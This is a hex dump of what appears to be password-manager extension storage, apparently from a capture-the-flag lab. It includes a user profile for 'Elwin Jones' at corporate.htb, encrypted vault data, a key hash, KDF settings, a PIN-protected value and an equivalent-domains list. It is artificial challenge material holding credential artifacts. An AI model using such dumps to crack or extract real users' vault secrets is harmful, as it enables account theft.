00000C10: 6D 2B 71 37 48 45 46 70  66 39 55 56 54 58 4C 62  m+q7HEFpf9UVTXLb
00000C20: 62 6D 59 52 4D 56 57 32  75 57 68 30 6E 67 41 47  bmYRMVW2uWh0ngAG
00000C30: 43 67 33 59 70 65 59 6E  33 56 6B 79 76 35 4E 6D  Cg3YpeYn3Vkyv5Nm
00000C40: 48 78 67 30 2B 68 32 50  59 76 66 31 6F 39 6A 65  Hxg0+h2PYvf1o9je
00000C50: 49 61 54 35 51 55 52 6E  72 32 57 62 4A 62 64 73  IaT5QURnr2WbJbds
00000C60: 75 73 58 39 32 6C 33 77  4A 31 66 51 39 35 61 2F  usX92l3wJ1fQ95a/
00000C70: 2B 7A 52 4F 42 61 63 5A  31 6D 4E 4C 33 51 7A 6F  +zROBacZ1mNL3Qzo
00000C80: 76 2F 62 6C 51 4A 6F 63  41 51 38 30 32 6D 49 49  v/blQJocAQ802mII
00000C90: 45 6F 51 65 30 58 6E 68  46 33 44 42 6E 59 37 50  EoQe0XnhF3DBnY7P
00000CA0: 6E 6F 56 5A 54 31 62 67  78 32 6B 61 44 56 46 4C  noVZT1bgx2kaDVFL
00000CB0: 6C 4D 41 43 6F 64 4D 76  46 61 34 35 4E 7A 39 31  lMACodMvFa45Nz91
00000CC0: 4E 42 34 44 4E 65 6A 7A  71 30 4D 79 75 34 56 4D  NB4DNejzq0Myu4VM
00000CD0: 58 4C 77 30 73 66 30 57  64 4E 5A 34 45 45 6B 42  XLw0sf0WdNZ4EEkB
00000CE0: 54 55 6E 56 44 51 53 66  2F 35 73 7A 61 72 6D 57  TUnVDQSf/5szarmW
00000CF0: 34 48 67 45 61 6B 58 39  49 41 73 7A 50 55 4D 59  4HgEakX9IAszPUMY
00000D00: 47 4A 4B 61 71 51 39 62  66 35 50 69 73 61 70 39  GJKaqQ9bf5Pisap9
00000D10: 6A 5A 4F 65 4E 46 32 30  42 63 70 7A 78 59 4E 56  jZOeNF20BcpzxYNV
00000D20: 54 45 5A 65 51 37 57 4F  44 6D 53 4F 34 66 73 74  TEZeQ7WODmSO4fst
00000D30: 62 48 44 35 62 73 4A 72  52 38 73 50 63 55 32 31  bHD5bsJrR8sPcU21
00000D40: 65 6B 65 4E 46 6A 49 68  6C 39 43 37 32 43 43 57  ekeNFjIhl9C72CCW
00000D50: 44 65 76 47 4F 46 49 74  77 4C 4A 70 35 35 64 58  DevGOFItwLJp55dX
00000D60: 31 2F 2F 70 58 44 64 67  52 49 5A 78 2F 44 2B 7A  1//pXDdgRIZx/D+z
00000D70: 61 72 35 58 58 2B 41 76  33 41 67 4F 45 79 46 42  ar5XX+Av3AgOEyFB
00000D80: 36 35 55 64 4E 6E 51 65  50 49 37 55 46 64 34 33  65UdNnQePI7UFd43
00000D90: 61 2B 6B 6D 41 44 34 6E  38 64 58 4A 6B 61 6C 32  a+kmAD4n8dXJkal2
00000DA0: 47 62 68 42 65 7A 38 6A  39 38 51 34 4E 30 38 47  GbhBez8j98Q4N08G
00000DB0: 64 6A 47 4D 39 63 61 62  58 67 45 56 6E 69 67 65  djGM9cabXgEVnige
00000DC0: 50 72 67 33 37 6B 38 59  72 68 42 43 4C 6D 53 6A  Prg37k8YrhBCLmSj
00000DD0: 4F 7A 34 30 48 68 59 54  36 6B 79 6E 31 67 73 34  Oz40HhYT6kyn1gs4
00000DE0: 4E 4A 55 30 6F 66 44 36  65 34 44 6C 39 51 6C 2F  NJU0ofD6e4Dl9Ql/
00000DF0: 72 37 39 49 42 71 63 65  4D 75 6C 6E 32 63 55 4C  r79IBqceMuln2cUL
00000E00: 39 6B 42 59 68 52 53 52  53 38 76 46 36 69 75 62  9kBYhRSRS8vF6iub
00000E10: 56 75 56 68 31 61 6D 43  4E 43 50 31 6B 49 75 6E  VuVh1amCNCP1kIun
00000E20: 6E 2B 32 5A 57 36 4F 50  57 6C 44 6A 56 63 7A 65  n+2ZW6OPWlDjVcze
00000E30: 62 73 65 78 69 57 67 31  74 67 43 65 6B 56 78 4C  bsexiWg1tgCekVxL
00000E40: 45 70 73 45 52 6F 2B 68  30 64 71 33 39 75 37 47  EpsERo+h0dq39u7G
00000E50: 4C 39 48 76 30 6C 34 6E  37 37 49 64 52 4D 73 39  L9Hv0l4n77IdRMs9
00000E60: 6C 42 77 71 34 44 6A 6A  68 36 76 52 4F 2B 34 65  lBwq4Djjh6vRO+4e
00000E70: 71 4C 77 4C 4C 78 72 35  44 58 33 51 62 39 79 4D  qLwLLxr5DX3Qb9yM
00000E80: 2F 62 65 6F 6E 6E 4D 56  45 4F 76 72 38 43 70 70  /beonnMVEOvr8Cpp
00000E90: 6F 72 59 72 75 55 79 4D  6D 77 6C 39 4F 59 43 42  orYruUyMmwl9OYCB
00000EA0: 70 4C 77 68 63 50 69 50  32 57 74 34 75 45 55 48  pLwhcPiP2Wt4uEUH
00000EB0: 76 6B 52 6E 5A 76 59 55  2B 78 4B 74 51 32 49 48  vkRnZvYU+xKtQ2IH
00000EC0: 38 36 69 6A 34 75 6B 47  51 4E 75 50 69 4A 45 7A  86ij4ukGQNuPiJEz
00000ED0: 76 76 37 5A 32 33 61 76  33 5A 77 72 31 69 77 4C  vv7Z23av3Zwr1iwL
00000EE0: 56 55 53 77 38 43 54 59  50 64 6A 4E 77 38 79 75  VUSw8CTYPdjNw8yu
00000EF0: 71 4D 45 5A 6B 4D 4C 77  6E 49 55 32 4A 58 55 35  qMEZkMLwnIU2JXU5
00000F00: 33 47 72 58 62 6F 46 4E  47 55 77 6A 6C 45 51 47  3GrXboFNGUwjlEQG
00000F10: 6A 37 6C 31 50 6F 34 68  47 30 75 35 56 46 72 48  j7l1Po4hG0u5VFrH
00000F20: 51 41 69 7A 55 30 4D 61  56 43 78 44 49 39 58 4A  QAizU0MaVCxDI9XJ
00000F30: 48 42 56 69 73 59 44 75  53 54 53 47 73 54 49 2B  HBVisYDuSTSGsTI+
00000F40: 34 73 37 34 72 63 66 78  58 66 6D 64 65 6B 6E 31  4s74rcfxXfmdekn1
00000F50: 6A 53 62 58 6F 43 78 30  68 59 33 2F 55 37 5A 67  jSbXoCx0hY3/U7Zg
00000F60: 79 54 76 36 70 49 64 46  31 55 35 4F 45 56 44 34  yTv6pIdF1U5OEVD4
00000F70: 75 44 4C 31 4B 71 78 32  61 38 31 6E 4B 36 51 44  uDL1Kqx2a81nK6QD
00000F80: 77 76 2F 63 6E 78 54 43  52 56 4B 32 61 6F 46 75  wv/cnxTCRVK2aoFu
00000F90: 57 71 67 74 35 37 62 53  63 33 42 4D 2F 47 56 77  Wqgt57bSc3BM/GVw
00000FA0: 75 50 73 6F 4D 74 6F 64  7A 33 57 76 71 4F 65 6C  uPsoMtodz3WvqOel
00000FB0: 4D 50 4D 59 6B 76 6A 51  44 30 6D 44 50 31 41 74  MPMYkvjQD0mDP1At
00000FC0: 36 2F 56 66 4D 66 52 30  4E 50 4E 30 65 76 74 62  6/VfMfR0NPN0evtb
00000FD0: 41 58 4F 52 64 78 7A 4F  57 68 66 49 2F 54 44 75  AXORdxzOWhfI/TDu
00000FE0: 4F 50 6A 32 53 4C 58 36  49 38 6A 61 37 64 6A 52  OPj2SLX6I8ja7djR
00000FF0: 79 30 79 53 69 31 73 63  39 53 54 74 62 53 43 65  y0ySi1sc9STtbSCe
00001000: 53 6A 4D 4D 44 39 6F 68  2F 49 63 74 41 6A 37 54  SjMMD9oh/IctAj7T
00001010: 78 35 58 38 55 66 35 71  4A 59 42 71 44 6A 58 59  x5X8Uf5qJYBqDjXY
00001020: 68 39 6F 43 59 50 65 59  6B 4A 4C 64 35 6B 37 6B  h9oCYPeYkJLd5k7k
00001030: 63 5A 6F 75 6C 76 74 64  6E 50 70 59 58 4E 64 7A  cZoulvtdnPpYXNdz
00001040: 46 66 52 74 77 51 77 64  32 61 73 32 43 53 49 4B  FfRtwQwd2as2CSIK
00001050: 77 2B 46 47 53 50 6A 42  4B 7A 36 4D 64 4B 6D 68  w+FGSPjBKz6MdKmh
00001060: 4B 5A 49 4E 4E 54 30 76  59 6A 67 67 52 38 35 55  KZINNT0vYjggR85U
00001070: 37 36 48 62 33 50 63 77  72 73 65 4E 48 61 2B 4F  76Hb3PcwrseNHa+O
00001080: 42 68 59 50 34 79 71 67  63 4B 51 5A 35 41 3D 7C  BhYP4yqgcKQZ5A=|
00001090: 37 4A 67 51 64 69 62 42  78 62 7A 34 30 78 4E 54  7JgQdibBxbz40xNT
000010A0: 4A 4A 48 57 65 34 56 38  4C 4E 72 39 45 7A 7A 36  JJHWe4V8LNr9Ezz6
000010B0: 71 45 2F 52 61 7A 34 6F  4F 67 6F 3D 00 00 00 00  qE/Raz4oOgo=....
000010C0: 00 00 00 00 13 00 FF FF  0F 00 00 80 04 00 FF FF  ................
000010D0: 63 72 79 70 74 6F 4D 61  73 74 65 72 4B 65 79 00  cryptoMasterKey.
000010E0: 00 00 00 00 00 00 FF FF  09 00 00 80 04 00 FF FF  ................
000010F0: 70 75 62 6C 69 63 4B 65  79 00 00 00 00 00 00 00  publicKey.......
00001100: 00 00 00 00 01 00 FF FF  00 00 00 00 13 00 FF FF  ................
00001110: 07 00 00 80 04 00 FF FF  70 72 6F 66 69 6C 65 00  ........profile.
00001120: 00 00 00 00 08 00 FF FF  06 00 00 80 04 00 FF FF  ................
00001130: 75 73 65 72 49 64 00 00  24 00 00 80 04 00 FF FF  userId..$.......
00001140: 30 38 62 33 37 35 31 62  2D 61 61 64 35 2D 34 36  08b3751b-aad5-46
00001150: 31 36 2D 62 31 66 37 2D  30 31 35 64 33 62 65 37  16-b1f7-015d3be7
00001160: 34 39 64 62 00 00 00 00  04 00 00 80 04 00 FF FF  49db............
00001170: 6E 61 6D 65 00 00 00 00  0B 00 00 80 04 00 FF FF  name............
00001180: 45 6C 77 69 6E 20 4A 6F  6E 65 73 00 00 00 00 00  Elwin Jones.....
00001190: 05 00 00 80 04 00 FF FF  65 6D 61 69 6C 00 00 00  ........email...
000011A0: 19 00 00 80 04 00 FF FF  65 6C 77 69 6E 2E 6A 6F  ........elwin.jo
000011B0: 6E 65 73 40 63 6F 72 70  6F 72 61 74 65 2E 68 74  nes@corporate.ht
000011C0: 62 00 00 00 00 00 00 00  14 00 00 80 04 00 FF FF  b...............
000011D0: 68 61 73 50 72 65 6D 69  75 6D 50 65 72 73 6F 6E  hasPremiumPerson
000011E0: 61 6C 6C 79 00 00 00 00  01 00 00 00 02 00 FF FF  ally............
000011F0: 0D 00 00 80 04 00 FF FF  6B 64 66 49 74 65 72 61  ........kdfItera
00001200: 74 69 6F 6E 73 00 00 00  C0 27 09 00 03 00 FF FF  tions....'......
00001210: 09 00 00 80 04 00 FF FF  6B 64 66 4D 65 6D 6F 72  ........kdfMemor
00001220: 79 00 00 00 00 00 00 00  00 00 00 00 00 00 FF FF  y...............
00001230: 0E 00 00 80 04 00 FF FF  6B 64 66 50 61 72 61 6C  ........kdfParal
00001240: 6C 65 6C 69 73 6D 00 00  00 00 00 00 00 00 FF FF  lelism..........
00001250: 07 00 00 80 04 00 FF FF  6B 64 66 54 79 70 65 00  ........kdfType.
00001260: 00 00 00 00 03 00 FF FF  07 00 00 80 04 00 FF FF  ................
00001270: 6B 65 79 48 61 73 68 00  2C 00 00 80 04 00 FF FF  keyHash.,.......
00001280: 37 34 45 37 31 6F 50 5A  49 39 76 4E 6E 6F 45 53  74E71oPZI9vNnoES
00001290: 4E 6B 75 4C 6C 61 44 54  6C 6B 31 7A 41 2F 63 48  NkuLlaDTlk1zA/cH
000012A0: 35 6C 35 58 4E 4F 4C 4F  63 34 77 3D 00 00 00 00  5l5XNOLOc4w=....
000012B0: 0D 00 00 80 04 00 FF FF  65 6D 61 69 6C 56 65 72  ........emailVer
000012C0: 69 66 69 65 64 00 00 00  01 00 00 00 02 00 FF FF  ified...........
000012D0: 10 00 00 80 04 00 FF FF  75 73 65 73 4B 65 79 43  ........usesKeyC
000012E0: 6F 6E 6E 65 63 74 6F 72  00 00 00 00 02 00 FF FF  onnector........
000012F0: 1C 00 00 80 04 00 FF FF  63 6F 6E 76 65 72 74 41  ........convertA
00001300: 63 63 6F 75 6E 74 54 6F  4B 65 79 43 6F 6E 6E 65  ccountToKeyConne
00001310: 63 74 6F 72 00 00 00 00  00 00 00 00 00 00 FF FF  ctor............
00001320: 08 00 00 80 04 00 FF FF  6C 61 73 74 53 79 6E 63  ........lastSync
00001330: 18 00 00 80 04 00 FF FF  32 30 32 33 2D 30 34 2D  ........2023-04-
00001340: 31 33 54 31 35 3A 34 30  3A 32 37 2E 35 33 33 5A  13T15:40:27.533Z
00001350: 1A 00 00 80 04 00 FF FF  68 61 73 50 72 65 6D 69  ........hasPremi
00001360: 75 6D 46 72 6F 6D 4F 72  67 61 6E 69 7A 61 74 69  umFromOrganizati
00001370: 6F 6E 00 00 00 00 00 00  00 00 00 00 01 00 FF FF  on..............
00001380: 00 00 00 00 13 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001390: 73 65 74 74 69 6E 67 73  00 00 00 00 08 00 FF FF  settings........
000013A0: 0F 00 00 80 04 00 FF FF  65 6E 76 69 72 6F 6E 6D  ........environm
000013B0: 65 6E 74 55 72 6C 73 00  00 00 00 00 08 00 FF FF  entUrls.........
000013C0: 04 00 00 80 04 00 FF FF  62 61 73 65 00 00 00 00  ........base....
000013D0: 31 00 00 80 04 00 FF FF  68 74 74 70 3A 2F 2F 70  1.......http://p
000013E0: 61 73 73 77 6F 72 64 74  65 73 74 69 6E 67 73 65  asswordtestingse
000013F0: 72 76 65 72 2D 63 6F 72  70 6F 72 61 74 65 2E 6C  rver-corporate.l
00001400: 6F 63 61 6C 3A 38 30 30  30 00 00 00 00 00 00 00  ocal:8000.......
00001410: 03 00 00 80 04 00 FF FF  61 70 69 00 00 00 00 00  ........api.....
00001420: 00 00 00 00 00 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001430: 69 64 65 6E 74 69 74 79  00 00 00 00 00 00 FF FF  identity........
00001440: 05 00 00 80 04 00 FF FF  69 63 6F 6E 73 00 00 00  ........icons...
00001450: 00 00 00 00 00 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00001460: 6E 6F 74 69 66 69 63 61  74 69 6F 6E 73 00 00 00  notifications...
00001470: 00 00 00 00 00 00 FF FF  06 00 00 80 04 00 FF FF  ................
00001480: 65 76 65 6E 74 73 00 00  00 00 00 00 00 00 FF FF  events..........
00001490: 08 00 00 80 04 00 FF FF  77 65 62 56 61 75 6C 74  ........webVault
000014A0: 00 00 00 00 00 00 FF FF  0C 00 00 80 04 00 FF FF  ................
000014B0: 6B 65 79 43 6F 6E 6E 65  63 74 6F 72 00 00 00 00  keyConnector....
000014C0: 00 00 00 00 00 00 FF FF  00 00 00 00 13 00 FF FF  ................
000014D0: 0C 00 00 80 04 00 FF FF  70 69 6E 50 72 6F 74 65  ........pinProte
000014E0: 63 74 65 64 00 00 00 00  00 00 00 00 08 00 FF FF  cted............
000014F0: 09 00 00 80 04 00 FF FF  65 6E 63 72 79 70 74 65  ........encrypte
00001500: 64 00 00 00 00 00 00 00  88 00 00 00 04 00 FF FF  d...............
00001510: 32 00 2E 00 44 00 58 00  47 00 64 00 53 00 61 00  2...D.X.G.d.S.a.
00001520: 4E 00 38 00 74 00 4C 00  71 00 35 00 74 00 53 00  N.8.t.L.q.5.t.S.
00001530: 59 00 58 00 31 00 4A 00  30 00 5A 00 44 00 67 00  Y.X.1.J.0.Z.D.g.
00001540: 3D 00 3D 00 7C 00 34 00  75 00 58 00 4C 00 6D 00  =.=.|.4.u.X.L.m.
00001550: 52 00 4E 00 70 00 2F 00  64 00 4A 00 67 00 45 00  R.N.p./.d.J.g.E.
00001560: 34 00 31 00 4D 00 59 00  56 00 78 00 71 00 2B 00  4.1.M.Y.V.x.q.+.
00001570: 6E 00 76 00 64 00 61 00  75 00 69 00 6E 00 75 00  n.v.d.a.u.i.n.u.
00001580: 30 00 59 00 4B 00 32 00  65 00 4B 00 6F 00 4D 00  0.Y.K.2.e.K.o.M.
00001590: 76 00 41 00 45 00 6D 00  76 00 4A 00 38 00 41 00  v.A.E.m.v.J.8.A.
000015A0: 4A 00 39 00 44 00 62 00  65 00 78 00 65 00 77 00  J.9.D.b.e.x.e.w.
000015B0: 72 00 67 00 68 00 58 00  77 00 6C 00 42 00 76 00  r.g.h.X.w.l.B.v.
000015C0: 39 00 70 00 52 00 7C 00  55 00 63 00 42 00 7A 00  9.p.R.|.U.c.B.z.
000015D0: 69 00 53 00 59 00 75 00  43 00 69 00 4A 00 70 00  i.S.Y.u.C.i.J.p.
000015E0: 70 00 35 00 4D 00 4F 00  52 00 42 00 67 00 48 00  p.5.M.O.R.B.g.H.
000015F0: 76 00 52 00 32 00 6D 00  56 00 67 00 78 00 33 00  v.R.2.m.V.g.x.3.
00001600: 69 00 6C 00 70 00 51 00  68 00 4E 00 74 00 7A 00  i.l.p.Q.h.N.t.z.
00001610: 4E 00 4A 00 41 00 7A 00  66 00 34 00 4D 00 3D 00  N.J.A.z.f.4.M.=.
00001620: 00 00 00 00 13 00 FF FF  12 00 00 80 04 00 FF FF  ................
00001630: 76 61 75 6C 74 54 69 6D  65 6F 75 74 41 63 74 69  vaultTimeoutActi
00001640: 6F 6E 00 00 00 00 00 00  04 00 00 80 04 00 FF FF  on..............
00001650: 6C 6F 63 6B 00 00 00 00  0C 00 00 80 04 00 FF FF  lock............
00001660: 76 61 75 6C 74 54 69 6D  65 6F 75 74 00 00 00 00  vaultTimeout....
00001670: FF FF FF FF 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00001680: 70 72 6F 74 65 63 74 65  64 50 69 6E 00 00 00 00  protectedPin....
00001690: 00 00 00 00 00 00 FF FF  08 00 00 80 04 00 FF FF  ................
000016A0: 73 65 74 74 69 6E 67 73  00 00 00 00 08 00 FF FF  settings........
000016B0: 11 00 00 80 04 00 FF FF  65 71 75 69 76 61 6C 65  ........equivale
000016C0: 6E 74 44 6F 6D 61 69 6E  73 00 00 00 00 00 00 00  ntDomains.......
000016D0: 59 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  Y...............
000016E0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
000016F0: 0E 00 00 80 04 00 FF FF  61 6D 65 72 69 74 72 61  ........ameritra
00001700: 64 65 2E 63 6F 6D 00 00  01 00 00 00 03 00 FF FF  de.com..........
00001710: 10 00 00 80 04 00 FF FF  74 64 61 6D 65 72 69 74  ........tdamerit
00001720: 72 61 64 65 2E 63 6F 6D  00 00 00 00 13 00 FF FF  rade.com........
00001730: 01 00 00 00 03 00 FF FF  04 00 00 00 07 00 FF FF  ................
00001740: 00 00 00 00 03 00 FF FF  11 00 00 80 04 00 FF FF  ................
00001750: 62 61 6E 6B 6F 66 61 6D  65 72 69 63 61 2E 63 6F  bankofamerica.co
00001760: 6D 00 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  m...............
00001770: 08 00 00 80 04 00 FF FF  62 6F 66 61 2E 63 6F 6D  ........bofa.com
00001780: 02 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001790: 6D 62 6E 61 2E 63 6F 6D  03 00 00 00 03 00 FF FF  mbna.com........
000017A0: 0A 00 00 80 04 00 FF FF  75 73 65 63 66 6F 2E 63  ........usecfo.c
000017B0: 6F 6D 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  om..............
000017C0: 02 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  ................
000017D0: 00 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000017E0: 73 70 72 69 6E 74 2E 63  6F 6D 00 00 00 00 00 00  sprint.com......
000017F0: 01 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00001800: 73 70 72 69 6E 74 70 63  73 2E 63 6F 6D 00 00 00  sprintpcs.com...
00001810: 02 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
00001820: 6E 65 78 74 65 6C 2E 63  6F 6D 00 00 00 00 00 00  nextel.com......
00001830: 00 00 00 00 13 00 FF FF  03 00 00 00 03 00 FF FF  ................
00001840: 03 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00001850: 0B 00 00 80 04 00 FF FF  79 6F 75 74 75 62 65 2E  ........youtube.
00001860: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
00001870: 0A 00 00 80 04 00 FF FF  67 6F 6F 67 6C 65 2E 63  ........google.c
00001880: 6F 6D 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  om..............
00001890: 09 00 00 80 04 00 FF FF  67 6D 61 69 6C 2E 63 6F  ........gmail.co
000018A0: 6D 00 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  m...............
000018B0: 04 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
000018C0: 00 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000018D0: 61 70 70 6C 65 2E 63 6F  6D 00 00 00 00 00 00 00  apple.com.......
000018E0: 01 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000018F0: 69 63 6C 6F 75 64 2E 63  6F 6D 00 00 00 00 00 00  icloud.com......
00001900: 00 00 00 00 13 00 FF FF  05 00 00 00 03 00 FF FF  ................
00001910: 03 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00001920: 0E 00 00 80 04 00 FF FF  77 65 6C 6C 73 66 61 72  ........wellsfar
00001930: 67 6F 2E 63 6F 6D 00 00  01 00 00 00 03 00 FF FF  go.com..........
00001940: 06 00 00 80 04 00 FF FF  77 66 2E 63 6F 6D 00 00  ........wf.com..
00001950: 02 00 00 00 03 00 FF FF  16 00 00 80 04 00 FF FF  ................
00001960: 77 65 6C 6C 73 66 61 72  67 6F 61 64 76 69 73 6F  wellsfargoadviso
00001970: 72 73 2E 63 6F 6D 00 00  00 00 00 00 13 00 FF FF  rs.com..........
00001980: 06 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  ................
00001990: 00 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
000019A0: 6D 79 6D 65 72 72 69 6C  6C 2E 63 6F 6D 00 00 00  mymerrill.com...
000019B0: 01 00 00 00 03 00 FF FF  06 00 00 80 04 00 FF FF  ................
000019C0: 6D 6C 2E 63 6F 6D 00 00  02 00 00 00 03 00 FF FF  ml.com..........
000019D0: 0F 00 00 80 04 00 FF FF  6D 65 72 72 69 6C 6C 65  ........merrille
000019E0: 64 67 65 2E 63 6F 6D 00  00 00 00 00 13 00 FF FF  dge.com.........
000019F0: 07 00 00 00 03 00 FF FF  05 00 00 00 07 00 FF FF  ................
00001A00: 00 00 00 00 03 00 FF FF  11 00 00 80 04 00 FF FF  ................
00001A10: 61 63 63 6F 75 6E 74 6F  6E 6C 69 6E 65 2E 63 6F  accountonline.co
00001A20: 6D 00 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  m...............
00001A30: 08 00 00 80 04 00 FF FF  63 69 74 69 2E 63 6F 6D  ........citi.com
00001A40: 02 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00001A50: 63 69 74 69 62 61 6E 6B  2E 63 6F 6D 00 00 00 00  citibank.com....
00001A60: 03 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00001A70: 63 69 74 69 63 61 72 64  73 2E 63 6F 6D 00 00 00  citicards.com...
00001A80: 04 00 00 00 03 00 FF FF  12 00 00 80 04 00 FF FF  ................
00001A90: 63 69 74 69 62 61 6E 6B  6F 6E 6C 69 6E 65 2E 63  citibankonline.c
00001AA0: 6F 6D 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  om..............
00001AB0: 08 00 00 00 03 00 FF FF  07 00 00 00 07 00 FF FF  ................
00001AC0: 00 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001AD0: 63 6E 65 74 2E 63 6F 6D  01 00 00 00 03 00 FF FF  cnet.com........
00001AE0: 0A 00 00 80 04 00 FF FF  63 6E 65 74 74 76 2E 63  ........cnettv.c
00001AF0: 6F 6D 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  om..............
00001B00: 07 00 00 80 04 00 FF FF  63 6F 6D 2E 63 6F 6D 00  ........com.com.
00001B10: 03 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00001B20: 64 6F 77 6E 6C 6F 61 64  2E 63 6F 6D 00 00 00 00  download.com....
00001B30: 04 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001B40: 6E 65 77 73 2E 63 6F 6D  05 00 00 00 03 00 FF FF  news.com........
00001B50: 0A 00 00 80 04 00 FF FF  73 65 61 72 63 68 2E 63  ........search.c
00001B60: 6F 6D 00 00 00 00 00 00  06 00 00 00 03 00 FF FF  om..............
00001B70: 0A 00 00 80 04 00 FF FF  75 70 6C 6F 61 64 2E 63  ........upload.c
00001B80: 6F 6D 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  om..............
00001B90: 09 00 00 00 03 00 FF FF  04 00 00 00 07 00 FF FF  ................
00001BA0: 00 00 00 00 03 00 FF FF  12 00 00 80 04 00 FF FF  ................
00001BB0: 62 61 6E 61 6E 61 72 65  70 75 62 6C 69 63 2E 63  bananarepublic.c
00001BC0: 6F 6D 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  om..............
00001BD0: 07 00 00 80 04 00 FF FF  67 61 70 2E 63 6F 6D 00  ........gap.com.
00001BE0: 02 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00001BF0: 6F 6C 64 6E 61 76 79 2E  63 6F 6D 00 00 00 00 00  oldnavy.com.....
00001C00: 03 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00001C10: 70 69 70 65 72 6C 69 6D  65 2E 63 6F 6D 00 00 00  piperlime.com...
00001C20: 00 00 00 00 13 00 FF FF  0A 00 00 00 03 00 FF FF  ................
00001C30: 0E 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00001C40: 08 00 00 80 04 00 FF FF  62 69 6E 67 2E 63 6F 6D  ........bing.com
00001C50: 01 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00001C60: 68 6F 74 6D 61 69 6C 2E  63 6F 6D 00 00 00 00 00  hotmail.com.....
00001C70: 02 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001C80: 6C 69 76 65 2E 63 6F 6D  03 00 00 00 03 00 FF FF  live.com........
00001C90: 0D 00 00 80 04 00 FF FF  6D 69 63 72 6F 73 6F 66  ........microsof
00001CA0: 74 2E 63 6F 6D 00 00 00  04 00 00 00 03 00 FF FF  t.com...........
00001CB0: 07 00 00 80 04 00 FF FF  6D 73 6E 2E 63 6F 6D 00  ........msn.com.
00001CC0: 05 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00001CD0: 70 61 73 73 70 6F 72 74  2E 6E 65 74 00 00 00 00  passport.net....
00001CE0: 06 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00001CF0: 77 69 6E 64 6F 77 73 2E  63 6F 6D 00 00 00 00 00  windows.com.....
00001D00: 07 00 00 00 03 00 FF FF  13 00 00 80 04 00 FF FF  ................
00001D10: 6D 69 63 72 6F 73 6F 66  74 6F 6E 6C 69 6E 65 2E  microsoftonline.
00001D20: 63 6F 6D 00 00 00 00 00  08 00 00 00 03 00 FF FF  com.............
00001D30: 0A 00 00 80 04 00 FF FF  6F 66 66 69 63 65 2E 63  ........office.c
00001D40: 6F 6D 00 00 00 00 00 00  09 00 00 00 03 00 FF FF  om..............
00001D50: 0D 00 00 80 04 00 FF FF  6F 66 66 69 63 65 33 36  ........office36
00001D60: 35 2E 63 6F 6D 00 00 00  0A 00 00 00 03 00 FF FF  5.com...........
00001D70: 12 00 00 80 04 00 FF FF  6D 69 63 72 6F 73 6F 66  ........microsof
00001D80: 74 73 74 6F 72 65 2E 63  6F 6D 00 00 00 00 00 00  tstore.com......
00001D90: 0B 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001DA0: 78 62 6F 78 2E 63 6F 6D  0C 00 00 00 03 00 FF FF  xbox.com........
00001DB0: 09 00 00 80 04 00 FF FF  61 7A 75 72 65 2E 63 6F  ........azure.co
00001DC0: 6D 00 00 00 00 00 00 00  0D 00 00 00 03 00 FF FF  m...............
00001DD0: 10 00 00 80 04 00 FF FF  77 69 6E 64 6F 77 73 61  ........windowsa
00001DE0: 7A 75 72 65 2E 63 6F 6D  00 00 00 00 13 00 FF FF  zure.com........
00001DF0: 0B 00 00 00 03 00 FF FF  04 00 00 00 07 00 FF FF  ................
00001E00: 00 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00001E10: 75 61 32 67 6F 2E 63 6F  6D 00 00 00 00 00 00 00  ua2go.com.......
00001E20: 01 00 00 00 03 00 FF FF  07 00 00 80 04 00 FF FF  ................
00001E30: 75 61 6C 2E 63 6F 6D 00  02 00 00 00 03 00 FF FF  ual.com.........
00001E40: 0A 00 00 80 04 00 FF FF  75 6E 69 74 65 64 2E 63  ........united.c
00001E50: 6F 6D 00 00 00 00 00 00  03 00 00 00 03 00 FF FF  om..............
00001E60: 0E 00 00 80 04 00 FF FF  75 6E 69 74 65 64 77 69  ........unitedwi
00001E70: 66 69 2E 63 6F 6D 00 00  00 00 00 00 13 00 FF FF  fi.com..........
00001E80: 0C 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
00001E90: 00 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
